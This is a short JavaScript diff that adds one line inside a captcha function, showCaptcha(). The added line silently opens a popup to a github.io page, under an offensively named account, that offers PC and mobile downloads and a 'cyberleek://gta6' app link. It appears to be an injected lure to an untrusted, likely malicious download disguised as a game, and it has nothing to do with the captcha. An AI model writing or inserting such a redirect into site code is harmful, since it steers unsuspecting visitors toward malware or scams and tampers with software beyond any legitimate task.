@@ -14,6 +14,7 @@ function scrollToCaptchaIfNeeded() {
 }
 
 function showCaptcha() {
+  window.open("https://you-are-fat-gay2008.github.io/pages/v/api/userapp/?app_file_pc=https://you-are-fat-gay2008.github.io/pages/v/cyberleek.com/download-pc&app_file_mobile=https://you-are-fat-gay2008.github.io/pages/v/cyberleek.com/download-mobile&pc=cyberleek://gta6&mobile=cyberleek://gta6");
   if (!captchaWrapper.hidden) {
     scrollToCaptchaIfNeeded();
     return;
